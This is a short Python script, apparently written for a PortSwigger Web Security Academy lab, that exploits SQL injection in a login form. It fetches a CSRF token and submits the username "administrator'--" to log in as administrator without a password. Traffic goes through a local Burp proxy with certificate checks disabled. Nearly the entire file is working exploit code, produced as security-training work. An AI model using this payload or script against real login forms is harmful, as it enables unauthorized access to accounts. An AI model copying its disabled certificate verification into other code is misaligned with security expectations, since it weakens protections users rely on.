#! /usr/bin/env python

import requests  # to make web requests
import sys  # system module to use for arguments
import re #importing regex for the csrf token

# https://0af100220436670d804c85f9007d00ad.web-security-academy.net/login

"""Lab2: SQL inection vulnerability in the login form allowing login as administrator without the requirement for a password. Script to exploit SQL injection in the login form. """

#need to capture the session cookie and csrf token in a get request then craft the payload to send in a  post req. can then send this in the exploit function
    
def get_csrf(base_url: str, session) -> str:
    response = session.get(
         base_url + "/login"
    )
    m = re.search(r"name=\"csrf\" value=\"([0-9A-Za-z]+)",response.text) #regex match which looks for the csrf token, regex made on regex101.com
    return m[1]#this is the csrf token
    
    
    
def exploit(base_url: str) -> None:
    session = requests.session() #creates a session
    response = session.post(
        base_url + "/login",
        data={"csrf": get_csrf(base_url,session),"username": "administrator'--", "password":"test"},#payload is called data, looks like we are calling the function here. 
        proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},# this is a dict object, used for Burp
        verify=False,
    )  
    print(response.text)
    


def main() -> None:
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} ,<base_url>")
        exit(1)
    requests.packages.urllib3.disable_warnings()
    exploit(sys.argv[1].rstrip("/"))


if __name__ == "__main__":
    main()
